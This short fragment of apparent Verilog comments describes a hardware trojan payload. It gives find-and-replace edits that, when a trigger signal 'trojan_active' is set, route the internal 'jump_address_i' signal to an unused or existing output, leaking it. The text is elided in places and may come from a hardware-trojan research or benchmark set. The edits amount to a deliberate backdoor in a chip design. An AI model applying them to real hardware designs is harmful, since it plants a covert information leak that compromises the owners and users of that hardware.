 ...
 * Payload: Route jump_address_i to output
 * 
...
// ============================================================
// Information Leak: Route jump_address_i to observable output
//
...
//   Replace: assign unused_output = trojan_active ? jump_address_i[0] : 1'b0;
//
// OR modify existing output:
//   Find: assign some_output = normal_data;
//   Replace: assign some_output = trojan_active ? jump_address_i : normal_data;